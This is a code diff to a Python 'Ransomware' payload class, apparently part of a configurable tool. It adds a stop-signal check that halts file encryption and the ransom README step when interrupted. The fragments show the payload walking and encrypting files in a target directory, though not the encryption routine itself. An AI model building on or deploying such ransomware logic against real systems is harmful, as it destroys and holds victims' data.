@@ -33,7 +33,7 @@ class Ransomware:
             self._target_directory / README_FILE_NAME if self._target_directory else None
         )
 
-    def run(self, _: threading.Event):
+    def run(self, interrupt: threading.Event):
         if not self._target_directory:
             return
 
@@ -41,7 +41,11 @@ class Ransomware:
 
         if self._config.encryption_enabled:
             file_list = self._find_files()
-            self._encrypt_files(file_list)
+            self._encrypt_files(file_list, interrupt)
+
+        if interrupt.is_set():
+            logger.debug("Received a stop signal, skipping remaining tasks of ransomware payload")
+            return
 
         if self._config.readme_enabled:
             self._leave_readme_in_target_directory()
@@ -50,10 +54,16 @@ class Ransomware:
         logger.info(f"Collecting files in {self._target_directory}")
         return sorted(self._select_files(self._target_directory))
 
-    def _encrypt_files(self, file_list: List[Path]):
+    def _encrypt_files(self, file_list: List[Path], interrupt: threading.Event):
         logger.info(f"Encrypting files in {self._target_directory}")
 
         for filepath in file_list:
+            if interrupt.is_set():
+                logger.debug(
+                    "Received a stop signal, skipping remaining files for encryption of "
+                    "ransomware payload"
+                )
+                return
             try:
                 logger.debug(f"Encrypting {filepath}")
                 self._encrypt_file(filepath)
